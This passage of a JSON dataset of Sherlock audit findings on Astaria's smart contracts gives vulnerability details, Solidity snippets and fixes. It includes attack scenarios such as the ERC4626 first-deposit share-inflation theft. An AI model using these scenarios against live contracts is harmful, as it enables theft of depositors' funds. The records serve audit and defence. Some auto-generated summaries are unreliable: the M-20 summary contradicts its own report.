      "summary": "\nThis bug report is about the `_getInterest()` function in the LienToken.sol file of the 2022-10-astaria-judging repository. The function is intended to calculate the amount of interest generated by a timestamp, but the function incorrectly uses `block.timestamp` instead of the inputted timestamp in a crucial check. This can cause other functions that rely on this function to receive incorrect values. \n\nThe incorrect check uses `block.timestamp` before returning the maximum interest payment, which means that if the function is called when the lien is over, it will incorrectly return the maximum interest value. If the function is called when the lien is active for a timestamp long after the lien is over, it will skip the check to return maximum value and return the value that would have been generated if interest kept accruing indefinitely. \n\nThe `_getInterest()` function is used in many crucial protocol functions, so these incorrect values can have surprising and unexpected negative impacts on the protocol. The recommendation to fix this issue is to change `block.timestamp` to `timestamp` so that the if statement checks correctly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/25",
      "tags": [],
      "finders": [
        "obront",
        "sorrynotsorry"
      ]
    },
    {
      "id": "3697",
      "title": "M-22: _payment() function transfers full paymentAmount, overpaying first liens",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/28 \n\n## Found by \nobront, 0xRajeev, hansfriese, rvierdiiev, ak1, \\_\\_141345\\_\\_, bin2chen, tives\n\n## Summary\n\nThe `_payment()` function sends the full `paymentAmount` argument to the lien owner, which both (a) overpays lien owners if borrowers accidentally overpay and (b) sends the first lien owner all the funds for the entire loop of a borrower is intending to pay back multiple loans.\n\n## Vulnerability Detail\n\nThere are two `makePayment()` functions in LienToken.sol. One that allows the user to specific a `position` (which specific lien they want to pay back, and another that iterates through their liens, paying each back.\n\nIn both cases, the functions call out to `_payment()` with a `paymentAmount`, which is sent (in full) to the lien owner.\n\n```solidity\nTRANSFER_PROXY.tokenTransferFrom(WETH, payer, payee, paymentAmount);\n```\n\nThis behavior can cause problems in both cases.\n\nThe first case is less severe: If the user is intending to pay off one lien, and they enter a `paymentAmount` greater than the amount owed, the function will send the full `paymentAmount` to the lien owner, rather than just sending the amount owed.\n\nThe second case is much more severe: If the user is intending to pay towards all their loans, the `_makePayment()` function loops through open liens and performs the following:\n\n```solidity\nuint256 paymentAmount = totalCapitalAvailable;\nfor (uint256 i = 0; i < openLiens.length; ++i) {\n  uint256 capitalSpent = _payment(\n    collateralId,\n    uint8(i),\n    paymentAmount,\n    address(msg.sender)\n  );\n  paymentAmount -= capitalSpent;\n}\n```\n\nThe `_payment()` function is called with the first lien with `paymentAmount` set to the full amount sent to the function. The result is that this full amount is sent to the first lien holder, which could greatly exceed the amount they are owed. \n\n## Impact\n\nA user who is intending to pay off all their loans will end up paying all the funds they offered, but only paying off their first lien, potentially losing a large amount of funds.\n\n## Code Snippet\n\nThe `_payment()` function with the core error:\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L594-L649\n\nThe `_makePayment()` function that uses `_payment()` and would cause the most severe harm:\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L410-L424\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIn `_payment()`, if `lien.amount < paymentAmount`, set `paymentAmount = lien.amount`. \n\nThe result will be that, in this case, only `lien.amount` is transferred to the lien owner, and this value is also returned from the function to accurately represent the amount that was paid.",
      "summary": "\nThis bug report is about the `_payment()` function in the LienToken.sol smart contract, which is part of the Sherlock Audit's 2022-10-astaria-judging project. The bug was identified by obront, 0xRajeev, hansfriese, rvierdiiev, ak1, \\_\\_141345\\_\\_, bin2chen, and tives. \n\nThe bug is that when the `_payment()` function is called, it sends the full `paymentAmount` argument to the lien owner, which can result in overpaying lien owners if borrowers accidentally overpay, or sending the first lien owner all the funds for the entire loop if the borrower is intending to pay back multiple loans. \n\nThe `_payment()` function is called with the first lien with `paymentAmount` set to the full amount sent to the function. This means that the first lien holder receives the full amount, which could greatly exceed the amount they are owed. \n\nThe bug was found using manual review. The recommended fix is to modify the `_payment()` function so that if `lien.amount < paymentAmount`, `paymentAmount` is set to `lien.amount`. This will ensure that only the amount owed is transferred to the lien owner, and that this value is also returned from the function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/28",
      "tags": [],
      "finders": [
        "bin2chen",
        "0xRajeev",
        "hansfriese",
        "\\_\\_141345\\_\\_",
        "ak1",
        "tives",
        "rvierdiiev",
        "obront"
      ]
    },
    {
      "id": "3696",
      "title": "M-21: Underlying With Non-Standard Decimals Not Supported",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/33 \n\n## Found by \n0x0\n\n## Summary\n\nArithmetic operations are performed with the assumption that the token always has 18 decimals.\n\n## Vulnerability Detail\n\n[`LiquidationAccountant.claim`\n](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L65)\n\nArithmetic operations assume the token has [18 decimals](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L78). Not all tokens use 18 decimals, such as Tether.\n\n## Impact\n\n- The addition of underlying capital that does not use 18 decimals will not be possible.\n\n## Code Snippet\n\n```solidity\nuint256 transferAmount = withdrawRatio.mulDivDown(balance, 1e18);\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n- Consider whether the addition of capital that does not use 18 decimals is desirable in the future. If it is, refactor contracts to support tokens with non-standard decimals.",
      "summary": "\nThis bug report is about an issue with the LiquidationAccountant contract, which performs arithmetic operations with the assumption that the token always has 18 decimals. This means that any underlying capital that does not use 18 decimals will not be possible to add. The bug was found manually and the recommendation is to consider if the addition of capital with non-standard decimals is desirable in the future, and if so, refactor the contracts to support these tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/33",
      "tags": [],
      "finders": [
        "0x0"
      ]
    },
    {
      "id": "3695",
      "title": "M-20: timeToEpochEnd calculates backwards, breaking protocol math",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/50 \n\n## Found by \nobront, 0xNazgul, 0xRajeev, hansfriese\n\n## Summary\n\nWhen a lien is liquidated, it calls `timeToEpochEnd()` to determine if a liquidation accountant should be deployed and we should adjust the protocol math to expect payment in a future epoch. Because of an error in the implementation, all liquidations that will pay out in the current epoch are set up as future epoch liquidations.\n\n## Vulnerability Detail\n\nThe `liquidate()` function performs the following check to determine if it should set up the liquidation to be paid out in a future epoch:\n\n```solidity\nif (PublicVault(owner).timeToEpochEnd() <= COLLATERAL_TOKEN.auctionWindow())\n```\n\nThis check expects that `timeToEpochEnd()` will return the time until the epoch is over. However, the implementation gets this backwards:\n\n```solidity\nfunction timeToEpochEnd() public view returns (uint256) {\n  uint256 epochEnd = START() + ((currentEpoch + 1) * EPOCH_LENGTH());\n\n  if (epochEnd >= block.timestamp) {\n    return uint256(0);\n  }\n\n  return block.timestamp - epochEnd;\n}\n```\nIf `epochEnd >= block.timestamp`, that means that there IS remaining time in the epoch, and it should perform the calculation to return `epochEnd - block.timestamp`. In the opposite case, where `epochEnd <= block.timestamp`, it should return zero.\n\nThe result is that the function returns 0 for any epoch that isn't over. Since `0 < COLLATERAL_TOKEN.auctionWindow())`, all liquidated liens will trigger a liquidation accountant and the rest of the accounting for future epoch withdrawals.\n\n## Impact\n\nAccounting for a future epoch withdrawal causes a number of inconsistencies in the protocol's math, the impact of which vary depending on the situation. As a few examples:\n- It calls `decreaseEpochLienCount()`. This has the effect of artificially lowering the number of liens in the epoch, which will cause the final liens paid off in the epoch to revert (and will let us process the epoch earlier than intended).\n- It sets the payee of the lien to the liquidation accountant, which will pay out according to the withdrawal ratio (whereas all funds should be staying in the vault).\n- It calls `increaseLiquidationsExpectedAtBoundary()`, which can throw off the math when processing the epoch.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L562-L570\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L388-L415\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nFix the `timeToEpochEnd()` function so it calculates the remaining time properly:\n\n```solidity\nfunction timeToEpochEnd() public view returns (uint256) {\n  uint256 epochEnd = START() + ((currentEpoch + 1) * EPOCH_LENGTH());\n\n  if (epochEnd <= block.timestamp) {\n    return uint256(0);\n  }\n\n  return epochEnd - block.timestamp; //\n}\n```",
      "summary": "\nThis bug report is about an issue with the `timeToEpochEnd()` function in the Astaria protocol. When a lien is liquidated, it calls this function to determine if a liquidation accountant should be deployed and if the protocol math should expect payment in a future epoch. However, the function is implemented incorrectly and always returns 0, which sets up all liquidations to pay out in the current epoch, even if they should pay out in the future.\n\nThis causes a number of inconsistencies in the protocol's math, such as artificially lowering the number of liens in the epoch, setting the payee of the lien to the liquidation accountant instead of the vault, and throwing off the math when processing the epoch.\n\nThe bug was found by obront, 0xNazgul, 0xRajeev, and hansfriese and was identified using manual review. The code snippets associated with the bug can be found at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L562-L570 and https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L388-L415. The recommended solution is to fix the `timeToEpochEnd()` function so it calculates the remaining time properly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/50",
      "tags": [],
      "finders": [
        "0xRajeev",
        "obront",
        "0xNazgul",
        "hansfriese"
      ]
    },
    {
      "id": "3694",
      "title": "M-19: _validateCommitment fails for approved operators",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/52 \n\n## Found by \nobront, rvierdiiev\n\n## Summary\n\nIf a collateral token owner approves another user as an operator for all their tokens (rather than just for a given token), the validation check in `_validateCommitment()` will fail.\n\n## Vulnerability Detail\n\nThe collateral token is implemented as an ERC721, which has two ways to approve another user:\n- Approve them to take actions with a given token (`approve()`)\n- Approve them as an \"operator\" for all your owned tokens (`setApprovalForAll()`)\n\nHowever, when the `_validateCommitment()` function checks that the token is owned or approved by `msg.sender`, it does not accept those who are set as operators.\n\n```solidity\nif (msg.sender != holder) {\n  require(msg.sender == operator, \"invalid request\");\n}\n```\n\n## Impact\n\nApproved operators of collateral tokens will be rejected from taking actions with those tokens.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L152-L158\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInclude an additional check to confirm whether the `msg.sender` is approved as an operator on the token:\n\n```solidity\n    address holder = ERC721(COLLATERAL_TOKEN()).ownerOf(collateralId);\n    address approved = ERC721(COLLATERAL_TOKEN()).getApproved(collateralId);\n    address operator = ERC721(COLLATERAL_TOKEN()).isApprovedForAll(holder);\n\n    if (msg.sender != holder) {\n      require(msg.sender == operator || msg.sender == approved, \"invalid request\");\n    }\n```",
      "summary": "\nThis bug report is about an issue with the `_validateCommitment()` function in the VaultImplementation.sol file. This function is used to validate a request from a user to take action with a given token, but it does not accept users who are approved as operators for all tokens owned by the token owner. This means that approved operators of collateral tokens will be rejected from taking actions with those tokens. The bug was found by obront and rvierdiiev through manual review. The recommended fix is to include an additional check to confirm whether the `msg.sender` is approved as an operator on the token. This is done by adding an additional `require()` statement that checks if the `msg.sender` is equal to the operator or approved address.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/52",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "obront"
      ]
    },
    {
      "id": "3693",
      "title": "M-18: Strategist nonce is not checked",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/59 \n\n## Found by \nHonorLt, ctf\\_sec, cryptphi, rvierdiiev\n\n## Summary\nStrategist nonce is not checked while checking commitment. This makes impossible for strategist to cancel signed commitment.\n## Vulnerability Detail\n`VaultImplementation.commitToLien` is created to give the ability to borrow from the vault. The conditions of loan are discussed off chain and owner or delegate of the vault then creates and signes deal details. Later borrower can provide it as `IAstariaRouter.Commitment calldata params` param to VaultImplementation.commitToLien.\n\nAfter the checking of signer of commitment `VaultImplementation._validateCommitment` function [calls](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L187-L189) `AstariaRouter.validateCommitment`.\n\n```solidity\n  function validateCommitment(IAstariaRouter.Commitment calldata commitment)\n    public\n    returns (bool valid, IAstariaRouter.LienDetails memory ld)\n  {\n    require(\n      commitment.lienRequest.strategy.deadline >= block.timestamp,\n      \"deadline passed\"\n    );\n\n\n    require(\n      strategyValidators[commitment.lienRequest.nlrType] != address(0),\n      \"invalid strategy type\"\n    );\n\n\n    bytes32 leaf;\n    (leaf, ld) = IStrategyValidator(\n      strategyValidators[commitment.lienRequest.nlrType]\n    ).validateAndParse(\n        commitment.lienRequest,\n        COLLATERAL_TOKEN.ownerOf(\n          commitment.tokenContract.computeId(commitment.tokenId)\n        ),\n        commitment.tokenContract,\n        commitment.tokenId\n      );\n\n\n    return (\n      MerkleProof.verifyCalldata(\n        commitment.lienRequest.merkle.proof,\n        commitment.lienRequest.merkle.root,\n        leaf\n      ),\n      ld\n    );\n  }\n```\n\nThis function check additional params, one of which is `commitment.lienRequest.strategy.deadline`. But it doesn't check for the [nonce](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L77) of strategist here. But this nonce is used while [signing](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L100).\n\nAlso `AstariaRouter` gives ability to [increment nonce](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L130-L132) for strategist, but it is never called. That means that currently strategist use always same nonce and can't cancel his commitment.\n## Impact\nStrategist can't cancel his commitment. User can use this commitment to borrow up to 5 times.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nGive ability to strategist to call `increaseNonce` function.",
      "summary": "\nThis bug report is about the VaultImplementation.commitToLien function in the Astaria smart contract. The function is used to create and sign a loan agreement between a borrower and the vault. However, the function does not check the strategist nonce, which is used to sign the commitment. This means that the strategist cannot cancel the commitment, allowing the borrower to borrow up to 5 times. To fix this issue, the strategist should be able to call the increaseNonce function.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/59",
      "tags": [],
      "finders": [
        "ctf\\_sec",
        "rvierdiiev",
        "HonorLt",
        "cryptphi"
      ]
    },
    {
      "id": "3692",
      "title": "M-17: LienToken.createLien doesn't check if user should be liquidated and provides new loan",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/66 \n\n## Found by \nrvierdiiev\n\n## Summary\n`LienToken.createLien` doesn't check if user should be liquidated and provides new loan if auction do not exist for collateral.\n## Vulnerability Detail\n`LienToken.createLien` [relies](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L244-L246)  on `AuctionHouse` to check if new loan can be added to borrower. It assumes that if auction doesn't exist then user is safe to take new loan.\n\nThe problem is that to start auction with token that didn't pay the debt someone should call `AstariaRouter.liquidate` function. If no one did it then auction for the NFT will not exists, and `LienToken.createLien` will create new Lien to user, while he already didn't pay debt and should be liquidated.\n## Impact\nNew loan will be paid to user that didn't repay previous lien.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nCheck if user can be liquidated through all of his liens positions. If not then only proceed with new loan.\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nDisagree with high severity. User would have to voluntarily sign a lien for another user who is already late on their payments (should raise some red flags), should only be medium or low given external circumstances\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Disagree with high severity. User would have to voluntarily sign a lien for another user who is already late on their payments (should raise some red flags), should only be medium or low given external circumstances\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted.\n\n**sherlock-admin**\n\n> Escalation accepted.\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the issue M-17 which was found by rvierdiiev. The issue is that the function `LienToken.createLien` does not check if the user should be liquidated and provides a new loan if the auction for the collateral does not exist. This could lead to a situation where a user who has not paid off their debt is given a new loan. This could have an impact on the system as it could result in a user getting a new loan while they have not paid off their previous lien. The code snippet provided shows the code related to the issue. The tool used to find this issue was manual review. The recommendation for this issue is to check if the user can be liquidated through all their lien positions and proceed with a new loan only if the user is not able to be liquidated. A discussion was held between IAmTurnipBoy, sherlock-admin and Evert0x where IAmTurnipBoy suggested escalating the issue for 1 USDC and sherlock-admin accepted the escalation. This means that contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/66",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "3691",
      "title": "M-16: LienToken._payment function increases users debt",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/73 \n\n## Found by \nrvierdiiev\n\n## Summary\nLienToken._payment function increases users debt by setting `lien.amount = _getOwed(lien)`\n## Vulnerability Detail\n`LienToken._payment` is used by `LienToken.makePayment` [function](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L387-L389) that allows borrower to repay part or all his debt.\n\nAlso this function can be called by `AuctionHouse` when the lien is liquidated.\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L594-L649\n```solidity\n  function _payment(\n    uint256 collateralId,\n    uint8 position,\n    uint256 paymentAmount,\n    address payer\n  ) internal returns (uint256) {\n    if (paymentAmount == uint256(0)) {\n      return uint256(0);\n    }\n\n\n    uint256 lienId = liens[collateralId][position];\n    Lien storage lien = lienData[lienId];\n    uint256 end = (lien.start + lien.duration);\n    require(\n      block.timestamp < end || address(msg.sender) == address(AUCTION_HOUSE),\n      \"cannot pay off an expired lien\"\n    );\n\n\n    address lienOwner = ownerOf(lienId);\n    bool isPublicVault = IPublicVault(lienOwner).supportsInterface(\n      type(IPublicVault).interfaceId\n    );\n\n\n    lien.amount = _getOwed(lien);\n\n\n    address payee = getPayee(lienId);\n    if (isPublicVault) {\n      IPublicVault(lienOwner).beforePayment(lienId, paymentAmount);\n    }\n    if (lien.amount > paymentAmount) {\n      lien.amount -= paymentAmount;\n      lien.last = block.timestamp.safeCastTo32();\n      // slope does not need to be updated if paying off the rest, since we neutralize slope in beforePayment()\n      if (isPublicVault) {\n        IPublicVault(lienOwner).afterPayment(lienId);\n      }\n    } else {\n      if (isPublicVault && !AUCTION_HOUSE.auctionExists(collateralId)) {\n        // since the openLiens count is only positive when there are liens that haven't been paid off\n        // that should be liquidated, this lien should not be counted anymore\n        IPublicVault(lienOwner).decreaseEpochLienCount(\n          IPublicVault(lienOwner).getLienEpoch(end)\n        );\n      }\n      //delete liens\n      _deleteLienPosition(collateralId, position);\n      delete lienData[lienId]; //full delete\n\n\n      _burn(lienId);\n    }\n\n\n    TRANSFER_PROXY.tokenTransferFrom(WETH, payer, payee, paymentAmount);\n\n\n    emit Payment(lienId, paymentAmount);\n    return paymentAmount;\n  }\n```\n\nThe main problem is in line 617. `lien.amount = _getOwed(lien);`\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L617\n\nHere lien.amount becomes lien.amount + accrued interests, because `_getOwed` do that [calculation](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L549).\n\n`lien.amount` is the amount that user borrowed. So actually that line has just increased user's debt. And in case if he didn't pay all amount of lien, then next time he will pay more interests. \n\nExample.\nUser borrows 1 eth. His `lien.amount` is 1eth.\nThen he wants to repay some part(let's say 0.5 eth). Now his `lien.amount` becomes `lien.amount + interests`.\nWhen he pays next time, he pays `(lien.amount + interests) + new interests`. So interests are acummulated on previous interests.\n## Impact\nUser borrowed amount increases and leads to lose of funds.\n## Code Snippet\nProvided above\n## Tool used\n\nManual Review\n\n## Recommendation\nDo not update lien.amount to _getOwed(lien).\n\n## Discussion\n\n**Evert0x**\n\nDowngrading to medium\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nInvalid. All I see here is compounding interest. Nothing incorrect here, just a design choice. Plenty of loans use compounding interest.\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Invalid. All I see here is compounding interest. Nothing incorrect here, just a design choice. Plenty of loans use compounding interest.\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation rejected\n\nThe impact of this is it'll cause a user in this situation to pay compound interest. Since loan is only 2 weeks, that will be very small impact. But the more often you make a payment the more interest you pay, a valid medium severity finding.\n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> The impact of this is it'll cause a user in this situation to pay compound interest. Since loan is only 2 weeks, that will be very small impact. But the more often you make a payment the more interest you pay, a valid medium severity finding.\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about the LienToken._payment function in the 2022-10-astaria-judging project on Github. This function is used by the LienToken.makePayment and AuctionHouse when the lien is liquidated. The main problem is in line 617. Here lien.amount becomes lien.amount + accrued interests, because _getOwed do that calculation. This means that the user's debt is increased, and if they don't pay off the full amount, they will have to pay more interest on top of the interest already accrued. This issue was discussed and escalated by several users, and ultimately the escalation was rejected due to the small impact of the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/73",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "3690",
      "title": "M-15: LiquidationAccountant.claim may revert for some tokens",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/83 \n\n## Found by \n0x4141\n\n## Summary\n`LiquidationAccountant.claim` may initiate a transfer with the amount 0, which reverts for some tokens.\n\n## Vulnerability Detail\nSome tokens (e.g., LEND -> see https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers) revert when a transfer with amount 0 is initiated. This can happen within `claim` when the `withdrawRatio` is 100%.\n\n## Impact\nIn such a scenario, the funds are not claimable, leading to a loss of funds.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L88\n\n## Tool used\n\nManual Review\n\n## Recommendation\nDo not initiate a transfer when the amount is zero.",
      "summary": "\nThis bug report is about the issue M-15 found by 0x4141. It states that the `LiquidationAccountant.claim` function may initiate a transfer with the amount 0, which reverts for some tokens. This is due to some tokens (e.g., LEND) reverting when a transfer with amount 0 is initiated. If this happens, the funds are not claimable, leading to a loss of funds. The code snippet can be found at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L88 and the bug was found through manual review. The recommendation is to not initiate a transfer when the amount is zero.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/83",
      "tags": [],
      "finders": [
        "0x4141"
      ]
    },
    {
      "id": "3689",
      "title": "M-14: LiquidityProvider can also lend to PrivateVault",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/141 \n\n## Found by \nneila\n\n## Summary\nInsufficient access control for lending to PublicVault\nfound by [yawn-c111](https://github.com/yawn-c111)\n\n## Vulnerability Detail\nDocs says as follows\nhttps://docs.astaria.xyz/docs/intro\n> Any strategists may provide their own capital to fund these loans through their own `PrivateVaults`, and whitelisted strategists can deploy `PublicVaults` that accept funds from other liquidity providers.\n\nHowever, Liquidity Providers can also lend to `PrivateVault`.\n\nThis is because `lendToVault` function is controlled by `mapping(address => address) public vaults`, which are managed by `_newVault` function and include `PrivateVault`s\n\nThis leads to unexpected atttack.\n\n## Impact \nUnexpected liquidity providers can lend to private vaults\n\n## Code Snippet\nhttps://github.com/unchain-dev/2022-10-astaria-UNCHAIN/blob/main/src/AstariaRouter.sol#L324\n\n```solidity\nfunction lendToVault(IVault vault, uint256 amount) external whenNotPaused {\n    TRANSFER_PROXY.tokenTransferFrom(\n      address(WETH),\n      address(msg.sender),\n      address(this),\n      amount\n    );\n\n    require(\n      vaults[address(vault)] != address(0),\n      \"lendToVault: vault doesn't exist\"\n    );\n    WETH.safeApprove(address(vault), amount);\n    vault.deposit(amount, address(msg.sender));\n  }\n```\n\nhttps://github.com/unchain-dev/2022-10-astaria-UNCHAIN/blob/main/src/AstariaRouter.sol#L500\n\n```solidity\nfunction _newVault(\n    uint256 epochLength,\n    address delegate,\n    uint256 vaultFee\n  ) internal returns (address) {\n    uint8 vaultType;\n\n    address implementation;\n    if (epochLength > uint256(0)) {\n      require(\n        epochLength >= minEpochLength && epochLength <= maxEpochLength,\n        \"epochLength must be greater than or equal to MIN_EPOCH_LENGTH and less than MAX_EPOCH_LENGTH\"\n      );\n      implementation = VAULT_IMPLEMENTATION;\n      vaultType = uint8(VaultType.PUBLIC);\n    } else {\n      implementation = SOLO_IMPLEMENTATION;\n      vaultType = uint8(VaultType.SOLO);\n    }\n\n    //immutable data\n    address vaultAddr = ClonesWithImmutableArgs.clone(\n      implementation,\n      abi.encodePacked(\n        address(msg.sender),\n        address(WETH),\n        address(COLLATERAL_TOKEN),\n        address(this),\n        address(COLLATERAL_TOKEN.AUCTION_HOUSE()),\n        block.timestamp,\n        epochLength,\n        vaultType,\n        vaultFee\n      )\n    );\n\n    //mutable data\n    VaultImplementation(vaultAddr).init(\n      VaultImplementation.InitParams(delegate)\n    );\n\n    vaults[vaultAddr] = msg.sender;\n\n    emit NewVault(msg.sender, vaultAddr);\n\n    return vaultAddr;\n  }\n```\n\n## Tool used\nManual Review\n\n## Recommendation\ncreate requirement to lend to only PublicVaults.",
      "summary": "\nThis bug report is about an issue found in the AstariaRouter.sol code which is part of the Astaria project. The issue is that Liquidity Providers can lend to PrivateVaults, which is not intended behavior. This unexpected behavior was found by neila and yawn-c111 during a manual review of the code. \n\nThe vulnerability is due to the lendToVault function being controlled by a mapping of address to address, which includes PrivateVaults. This leads to an unexpected attack vector, where unexpected liquidity providers can lend to private vaults. \n\nThe code snippets provided show the lendToVault function, which transfers funds from the WETH token to the address of the vault, and the _newVault function which creates a new vault and sets the sender of the message as the owner of the vault. \n\nThe recommendation for this issue is to create a requirement to lend to only PublicVaults.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/141",
      "tags": [],
      "finders": [
        "neila"
      ]
    },
    {
      "id": "3688",
      "title": "M-13: First ERC4626 deposit can break share calculation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/143 \n\n## Found by \npashov, ctf\\_sec, neila, rvierdiiev, \\_\\_141345\\_\\_, ak1, 0xNazgul, Jeiwan, joestakey\n\n## Summary\nThe first depositor of an ERC4626 vault can maliciously manipulate the share price by depositing the lowest possible amount (1 wei) of liquidity and then artificially inflating ERC4626.totalAssets.\n\nThis can inflate the base share price as high as 1:1e18 early on, which force all subsequence deposit to use this share price as a base and worst case, due to rounding down, if this malicious initial deposit front-run someone else depositing, this depositor will receive 0 shares and lost his deposited assets.\n\n## Vulnerability Detail\nGiven a vault with DAI as the underlying asset:\n\nAlice (attacker) deposits initial liquidity of 1 wei DAI via `deposit()`\nAlice receives 1e18 (1 wei) vault shares\nAlice transfers 1 ether of DAI via transfer() to the vault to artificially inflate the asset balance without minting new shares. The asset balance is now 1 ether + 1 wei DAI -> vault share price is now very high (= 1000000000000000000001 wei ~ 1000 * 1e18)\nBob (victim) deposits 100 ether DAI\nBob receives 0 shares\nBob receives 0 shares due to a precision issue. His deposited funds are lost.\n\nThe shares are calculated as following \n`return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());`\nIn case of a very high share price, due to totalAssets() > assets * supply, shares will be 0.\n## Impact\n`ERC4626` vault share price can be maliciously inflated on the initial deposit, leading to the next depositor losing assets due to precision issues.\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/ERC4626-Cloned.sol#L392\n## Tool used\n\nManual Review\n\n## Recommendation\nThis is a well-known issue, Uniswap and other protocols had similar issues when supply == 